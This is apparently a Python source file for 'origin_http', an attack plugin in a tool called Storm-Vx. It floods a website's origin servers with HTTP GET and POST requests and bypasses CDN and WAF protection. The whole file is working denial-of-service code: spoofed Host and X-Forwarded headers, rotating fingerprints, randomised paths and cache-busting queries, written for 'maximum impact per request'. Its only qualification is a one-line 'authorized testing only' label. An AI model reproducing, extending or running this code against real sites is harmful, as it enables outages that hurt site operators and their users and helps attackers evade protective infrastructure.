#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_origin_http — Origin IP HTTP Flood Attack Plugin (v24 P0)

Sends HTTP GET requests directly to origin IPs, bypassing CDN/WAF.
v24: Enhanced with smart header rotation, adaptive backoff,
and diverse path targeting for maximum impact per request.

Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import asyncio
import time
import random
from typing import Dict, Any
from urllib.parse import urlparse

import aiohttp


from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin, ResponseClass
from vf_common import C, rand_cache_bust, rand_str
from vf_validator import sanitize_path


__all__ = ["OriginHttpFloodPlugin"]


class OriginHttpFloodPlugin(AttackPlugin):
    """HTTP flood targeting origin IPs directly (CDN bypass).

    v24: Uses evasion-aware headers with X-Forwarded-* headers for
    proper routing, adaptive backoff, and diverse URL targeting.
    """

    meta = PluginMeta(
        name='origin_http',
        version='2.0.0',
        plugin_type='attack',
        description='Origin IP HTTP flood — smart headers bypassing CDN/WAF',
        tags=['origin', 'cdn-bypass', 'http', 'flood'],
        priority=30,
        compatible_profiles=[],
        requirements=['aiohttp'],
    )

    def _build_origin_url(self, origin_ip: str, context: AttackContext) -> str:
        """Build a URL pointing to an origin IP with a diverse path."""
        parsed = urlparse(context.url)
        # v24: Vary paths for more diverse targeting
        paths = ["/", f"/{rand_str(4)}", f"/api/{rand_str(3)}",
                 parsed.path or "/"]
        path = random.choice(paths)
        # BUG-24 FIX: Sanitize the path to prevent traversal attacks
        path = sanitize_path(path)
        query = f"?{rand_cache_bust()}" if random.random() > 0.3 else ""
        return f"{parsed.scheme}://{origin_ip}{path}{query}"

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """Origin IP HTTP flood worker."""
        _ssl = context.ssl_param

        origin_ips = context.origin_ips
        if not origin_ips:
            return

        delay_ms = context.extra.delay_ms
        domain = context.domain

        while not self._stop_event.is_set():
            try:
                origin_ip = random.choice(origin_ips)
                url = self._build_origin_url(origin_ip, context)

                # v24: Get fresh headers with document fingerprint + CDN bypass headers
                headers = self._get_fresh_headers(context, "document")
                headers["Host"] = domain
                headers["X-Forwarded-Host"] = domain
                headers["X-Forwarded-Proto"] = urlparse(context.url).scheme

                t = time.time()
                try:
                    # v24: Mix of GET and POST for diversity
                    if random.random() < 0.8:
                        async with context.session.get(url, headers=headers,
                                                       ssl=_ssl, allow_redirects=False) as resp:
                            rt = time.time() - t
                            resp_headers = dict(resp.headers)
                            response_class = self._process_response(resp.status, resp_headers, url=url[:60], worker_id=worker_id)
                            ok = response_class in (ResponseClass.OK, ResponseClass.AUTH_REQUIRED, ResponseClass.REDIRECT)
                            self._capture_response_cookies(resp, context)
                            await self._record("ORI", ok, resp.status, rt, url=url[:60])
                    else:
                        async with context.session.post(url, headers=headers,
                                                        data=f"q={rand_str(8)}",
                                                        ssl=_ssl, allow_redirects=False) as resp:
                            rt = time.time() - t
                            resp_headers = dict(resp.headers)
                            response_class = self._process_response(resp.status, resp_headers, url=url[:60], worker_id=worker_id)
                            ok = response_class in (ResponseClass.OK, ResponseClass.AUTH_REQUIRED, ResponseClass.REDIRECT)
                            self._capture_response_cookies(resp, context)
                            await self._record("ORI", ok, resp.status, rt, url=url[:60])
                except asyncio.CancelledError:
                    raise
                except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                    rt = time.time() - t
                    self._on_request_result(worker_id, False)
                    await self._record("ORI", False, 0, rt, err=type(exc).__name__)

                # v24: Adaptive sleep with backoff
                await self._adaptive_sleep(worker_id, delay_ms)

            except asyncio.CancelledError:
                return
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                self._on_request_result(worker_id, False)
                await self._record("ORI", False, 0, 0, err=type(exc).__name__)
                await asyncio.sleep(0.1)


